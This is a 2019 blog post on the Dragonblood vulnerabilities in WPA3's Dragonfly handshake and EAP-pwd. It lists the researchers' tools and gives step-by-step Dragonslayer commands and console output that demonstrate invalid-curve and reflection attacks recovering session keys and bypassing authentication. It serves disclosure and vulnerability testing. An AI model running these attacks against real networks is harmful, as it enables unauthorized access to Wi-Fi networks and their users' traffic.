---
layout: post
title:  "DragonBlood - WPA3 Attack toolkit"
description: "An overview of a newly released attack toolkit against WPA3"
date:   2019-04-10 13:49:33 +0000
tags: [Malware, Incident Response, Red-Team, Pentesting, Offensive, Defensive]
---

![Dragonfly WPA3 logo](/blog/assets/dragonfly.png)

## Dragonblood
Currently, all modern Wi-Fi networks use WPA2 to protect transmitted data. However, because WPA2 is more than 14 years old, the Wi-Fi Alliance recently announced the new and more secure WPA3 protocol. One of the main advantages of WPA3 is that, thanks to its underlying Dragonfly handshake, it's near impossible to crack the password of a network. Unfortunately, researchers found that even with WPA3, an attacker within range of a victim can still recover the password of the Wi-Fi network. 

The Dragonfly handshake, which forms the core of WPA3, is also used on certain Wi-Fi networks that require a username and password for access control. That is, Dragonfly is also used in the EAP-pwd protocol. Unfortunately, our attacks against WPA3 also work against EAP-pwd, meaning an adversary can even recover a user's password when EAP-pwd is used. Moreover, we also discovered serious bugs in most products that implement EAP-pwd. These allow an adversary to impersonate any user, and thereby access the Wi-Fi network, without knowing the user's password. Although we believe that EAP-pwd is used fairly infrequently, this still poses serious risks for many users, and illustrates the risks of incorrectly implementing Dragonfly.

The technical details behind our attacks against WPA3 can be found in our detailed research paper titled [Dragonblood: A Security Analysis of WPA3's SAE Handshake](https://papers.mathyvanhoef.com/dragonblood.pdf)

### Tools
Mathy Vanhoef (NYUAD) and Eyal Ronen (Tel Aviv University & KU Leuven) have released some scripts to test for certain vulnerabilities within the Dragonfly protocol within WPA3:
 * [Dragonslayer](https://github.com/vanhoefm/dragonslayer): implements attacks against EAP-pwd (to be released shortly).
 * [Dragondrain](https://github.com/vanhoefm/dragondrain-and-time): this tool can be used to test to which extend an Access Point is vulnerable to denial-of-service attacks against WPA3's SAE handshake.
 * [Dragontime](https://github.com/vanhoefm/dragondrain-and-time): this is an experimental tool to perform timing attacks against the SAE handshake if MODP group 22, 23, or 24 is used. Note that most WPA3 implementations by default do not enable these groups.
 * [Dragonforce](https://github.com/vanhoefm/dragonforce): this is an experimental tool which takes the information recover from our timing or cache-based attacks, and performs a password partitioning attack. This is similar to a dictionary attack.

### Dragonslayer / EAP-PWD Attacks
### Testing attacks against the server
#### Preparation
Edit the file dragonslayer/client.conf and specify:
 * The SSID of the network name using the ssid parameter.
 * A valid EAP-pwd username using the identity parameter. The attacks don't work with an invalid username.
 * Leave the other parameters untouched.

An example of dragonslayer/client.conf is the following:
```
network={
	ssid="dragonblood"
	key_mgmt=WPA-EAP
	eap=PWD
	identity="bob"
	password="unknown password"
}
```

#### Invalid curve attack
To test whether an EAP-pwd server is vulnerable to invalid curve attacks, start dragonslayer-client.sh using the -a 1 parameter. You must also specify the wireless interface being used with the -i parameter. For example:
```
[mathy@mathy-work dragonslayer]$ sudo ./dragonslayer-client.sh -i wlp2s0 -a 1
[sudo] password for mathy: 
Successfully initialized wpa_supplicant
wlp2s0: CTRL-EVENT-REGDOM-CHANGE init=DRIVER type=WORLD
wlp2s0: CTRL-EVENT-REGDOM-CHANGE init=DRIVER type=COUNTRY alpha2=US
wlp2s0: SME: Trying to authenticate with 38:2c:4a:c1:69:c0 (SSID='dragonblood' freq=5180 MHz)
wlp2s0: Trying to associate with 38:2c:4a:c1:69:c0 (SSID='dragonblood' freq=5180 MHz)
wlp2s0: Associated with 38:2c:4a:c1:69:c0
wlp2s0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlp2s0: CTRL-EVENT-EAP-STARTED EAP authentication started
wlp2s0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=52
wlp2s0: CTRL-EVENT-EAP-METHOD EAP vendor 0 method 52 (PWD) selected
EAP-PWD (peer): server sent id of - hexdump_ascii(len=21):
     74 68 65 73 65 72 76 65 72 40 65 78 61 6d 70 6c   theserver@exampl
     65 2e 63 6f 6d                                    e.com           
EAP-pwd: provisioned group 19
[03:21:18] 38:2c:4a:c1:69:c0: sending a scalar equal to zero
[03:21:18] 38:2c:4a:c1:69:c0: sending generator of small subgroup as the element
[03:21:18] 38:2c:4a:c1:69:c0: trying to recover session key..
[03:21:18] 38:2c:4a:c1:69:c0: successfully recovered the session key. Server is vulnerable to invalid curve attack!
wlp2s0: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
wlp2s0: PMKSA-CACHE-ADDED 38:2c:4a:c1:69:c0 0
wlp2s0: WPA: Key negotiation completed with 38:2c:4a:c1:69:c0 [PTK=CCMP GTK=CCMP]
wlp2s0: CTRL-EVENT-CONNECTED - Connection to 38:2c:4a:c1:69:c0 completed [id=0 id_str=]
```
Notice that the tool will display Server is vulnerable to invalid curve attack! if it is indeed vulnerable. If this message is not vulnerable, try performing the attack a few times again. If none of the attack attempts succeed, the EAP-pwd server is not vulnerable to this specific attack. In this case, also try attacking the EAP-pwd server using a small variant of the invalid curve attack using the -a 2 parameter:
```
 [mathy@mathy-work dragonslayer]$ sudo ./dragonslayer-client.sh -i wlp2s0 -a 2
 ...
```
Similar to the case above, it will display Server is vulnerable to invalid curve attack! if it is indeed vulnerable. If this message is not displayed after several attempts, the EAP-pwd server is not vulnerable to this specific attack.

We also recommend that you audit the server code itself. It can be that these specific attacks don't work, but that more specialized attacks would still work.

#### Reflection attack
To test whether an EAP-pwd server is vulnerable to a reflection attack, start dragonslayer-client.sh using the -a 0 parameter. You must also specify the wireless interface being used with the -i parameter. For example:
```
[mathy@mathy-work dragonslayer]$ sudo ./dragonslayer-client.sh -i wlp2s0 -a 0
Successfully initialized wpa_supplicant
wlp2s0: CTRL-EVENT-REGDOM-CHANGE init=DRIVER type=WORLD
wlp2s0: CTRL-EVENT-REGDOM-CHANGE init=DRIVER type=COUNTRY alpha2=US
wlp2s0: SME: Trying to authenticate with 38:2c:4a:c1:69:c0 (SSID='dragonblood' freq=5180 MHz)
wlp2s0: Trying to associate with 38:2c:4a:c1:69:c0 (SSID='dragonblood' freq=5180 MHz)
wlp2s0: Associated with 38:2c:4a:c1:69:c0
wlp2s0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlp2s0: CTRL-EVENT-EAP-STARTED EAP authentication started
wlp2s0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=52
wlp2s0: CTRL-EVENT-EAP-METHOD EAP vendor 0 method 52 (PWD) selected
EAP-PWD (peer): server sent id of - hexdump_ascii(len=21):
     74 68 65 73 65 72 76 65 72 40 65 78 61 6d 70 6c   theserver@exampl
     65 2e 63 6f 6d                                    e.com           
EAP-pwd: provisioned group 19
[03:22:11] 38:2c:4a:c1:69:c0: Reflected server scalar and element in commit frame
[03:22:11] 38:2c:4a:c1:69:c0: Skipping verification of recieved confirm value
[03:22:11] 38:2c:4a:c1:69:c0: Reflected confirm value in confirm frame
wlp2s0: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
[03:22:11] 38:2c:4a:c1:69:c0: AP is initiating 4-way handshake => server is vulnerable to reflection attack!
wlp2s0: PMKSA-CACHE-ADDED 38:2c:4a:c1:69:c0 0
[03:22:12] 38:2c:4a:c1:69:c0: AP is initiating 4-way handshake => server is vulnerable to reflection attack!
[03:22:13] 38:2c:4a:c1:69:c0: AP is initiating 4-way handshake => server is vulnerable to reflection attack!
[03:22:14] 38:2c:4a:c1:69:c0: AP is initiating 4-way handshake => server is vulnerable to reflection attack!
```

The tool will display server is vulnerable to reflection attack! if it is vulnerable. If this message is not display, try executing the attack several times. If the server is never detected as being vulnerable, it is not vulnerable to this specific attack.

### Testing attacks against the client
#### Preparation
First modify dragonslayer/hostapd.conf and edit the line interface= to specify the Wi-Fi interface that will be used to execute the tests. Note that for all tests, once the script is running, you must let the device being tested connect to the SSID dragonslayer with as username bob and the password can be anything. You can change settings of the AP by modifying dragonslayer/hostapd.conf.

#### Invalid curve attack
To test whether an EAP-pwd client is vulnerable to invalid curve attacks, start dragonslayer-server.sh using the -a 1 parameter. Using the server is running, connect to it with the client you want to test. For example:
```
[mathy@mathy-work dragonslayer]$ sudo ./dragonslayer-server.sh -a 1
Configuration file: hostapd.conf
Using interface wlp2s0 with hwaddr 8a:f5:40:f9:5d:c0 and ssid "dragonblood"
wlp2s0: interface state UNINITIALIZED->ENABLED
wlp2s0: AP-ENABLED 
wlp2s0: STA c4:e9:84:db:fb:7b IEEE 802.11: authenticated
wlp2s0: STA c4:e9:84:db:fb:7b IEEE 802.11: associated (aid 1)
wlp2s0: CTRL-EVENT-EAP-STARTED c4:e9:84:db:fb:7b
wlp2s0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlp2s0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=52
EAP-pwd: provisioned group 19
[03:48:15] c4:e9:84:db:fb:7b: sending a scalar equal to zero
[03:48:15] c4:e9:84:db:fb:7b: sending generator of small subgroup as the element
[03:48:15] c4:e9:84:db:fb:7b: configured X-coordinate of subgroup generator as session key
[03:48:15] c4:e9:84:db:fb:7b: Successfully recovered the session key. Client is vulnerable to invalid curve attack!
wlp2s0: CTRL-EVENT-EAP-SUCCESS c4:e9:84:db:fb:7b
wlp2s0: STA c4:e9:84:db:fb:7b WPA: pairwise key handshake completed (RSN)
wlp2s0: AP-STA-CONNECTED c4:e9:84:db:fb:7b
wlp2s0: STA c4:e9:84:db:fb:7b RADIUS: starting accounting session 35BB5B4BB3793544
wlp2s0: STA c4:e9:84:db:fb:7b IEEE 802.1X: authenticated - EAP type: 0 (unknown)
```
The tool will display Client is vulnerable to invalid curve attack! if it is vulnerable. If this message is not display, try executing the attack several times. If the server is never detected as being vulnerable, it is not vulnerable to this specific attack.

## Papers
* https://papers.mathyvanhoef.com/dragonblood.pdf

